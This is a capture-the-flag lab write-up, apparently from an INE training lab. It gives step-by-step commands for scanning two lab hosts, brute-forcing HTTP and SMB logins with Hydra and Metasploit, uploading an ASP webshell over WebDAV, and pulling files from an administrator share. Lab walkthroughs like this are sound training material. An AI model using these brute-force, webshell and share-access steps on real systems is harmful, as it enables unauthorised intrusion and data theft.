# Flag 1
User 'bob' might not have chosen a strong password. Try common passwords. (target1.ine.local)

```
nmap -A target1.ine.local
```

Open the webpage on Port 80
Run Hydra on login page
```
hydra -l bob -P /usr/share/metasploit/data/wordlist/unix_passwords.txt target.ine.local http-get
```
After obtaining password, login to the page, and n
```
dirb http://target1.ine.local -u bob:password_123321
```
Navigate to /webdav
where you can find the `flag1.txt`

# Flag 2

after that check `davtest`:
```
davtest -auth bob:password_123321 -url http://target1.ine.local/webdav
```
- Confirmed ASP file upload capability.

Then upload the webshell using cadaver

```
cadaver http://target1.ine.local/webdav
put /usr/share/webshells/asp/webshell.asp
```

Now access the shell form web
and get the `flag2` from C director.

# Flag 3 Now Target2
```
nmap -A target2.ine.local
```

go to msfconsole and 
```
search smb_login
set RHOSTS target2.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```
`bruteforce the smb username & password using provided wordlists`

after obtaining the creds 
login with smbclient
```
smbclient -L \\\\target2.ine.local\\ -U administrator
```
see for the available Shares
then connect to a specific share
```
smbclient \\\\target2.ine.local\\C$ -U administrator
```
```
ls
get flag3.txt
```

# Flag 4
```
cd Users\Administrator\Desktop\
ls
get flag4.txt
```
then obtain the `flag3.txt` and `flag4.txt` from downloads
